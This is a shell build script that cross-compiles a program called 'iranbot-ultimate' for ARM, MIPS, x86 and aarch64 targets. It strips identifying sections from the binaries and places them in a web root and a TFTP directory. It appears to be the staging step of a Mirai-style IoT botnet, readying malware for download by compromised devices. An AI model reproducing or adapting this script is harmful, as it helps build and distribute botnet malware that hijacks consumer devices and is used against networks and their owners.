#!/bin/sh
export PATH=/etc/xcompile/aarch64/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/i486/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:$PATH

cd bot

rm -f iranbot-ultimate.*

aarch64-linux-musl-gcc *.c -o iranbot-ultimate.aarch64 -DARCH_aarch64 -pthread -O3 -ffunction-sections -fdata-sections -fomit-frame-pointer -fno-stack-protector -fno-ident -fno-exceptions -fno-unwind-tables -fno-asynchronous-unwind-tables -Wl,--gc-sections -Wl,-s -Wl,--build-id=none -Wl,--hash-style=gnu -std=c99 -static
arm-linux-musleabi-gcc *.c -o iranbot-ultimate.armv4l -DARCH_armv4l -lpthread -O3 -ffunction-sections -fdata-sections -fomit-frame-pointer -fno-stack-protector -fno-ident -fno-exceptions -fno-unwind-tables -fno-asynchronous-unwind-tables -Wl,--gc-sections -Wl,-s -std=c99 -static
i486-linux-musl-gcc *.c -o iranbot-ultimate.x86_32 -DARCH_x86_32 -lpthread -O3 -ffunction-sections -fdata-sections -fomit-frame-pointer -fno-stack-protector -fno-ident -fno-exceptions -fno-unwind-tables -fno-asynchronous-unwind-tables -Wl,--gc-sections -Wl,-s -Wl,--build-id=none -Wl,--hash-style=gnu -std=c99 -static
mips-gcc *.c -o iranbot-ultimate.mips -DARCH_mips -lpthread -O3 -ffunction-sections -fdata-sections -fomit-frame-pointer -fno-stack-protector -fno-ident -fno-exceptions -fno-unwind-tables -fno-asynchronous-unwind-tables -Wl,--gc-sections -Wl,-s -std=c99 -static
mipsel-gcc *.c -o iranbot-ultimate.mipsel -DARCH_mipsel -lpthread -O3 -ffunction-sections -fdata-sections -fomit-frame-pointer -fno-stack-protector -fno-ident -fno-exceptions -fno-unwind-tables -fno-asynchronous-unwind-tables -Wl,--gc-sections -Wl,-s -std=c99 -static

aarch64-linux-musl-strip -S --strip-all --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag iranbot-ultimate.aarch64
arm-linux-musleabi-strip -S --strip-all --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag iranbot-ultimate.armv4l
i486-linux-musl-strip -S --strip-all --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag iranbot-ultimate.x86_32
mips-strip -S --strip-all --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag iranbot-ultimate.mips
mipsel-strip -S --strip-all --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag iranbot-ultimate.mipsel

mv iranbot-ultimate.* /var/www/html/
cp /var/www/html/iranbot-ultimate.* /srv/tftp/

cd ..

echo "DONE! Binaries in /var/www/html & /srv/tftp/"
exit 0
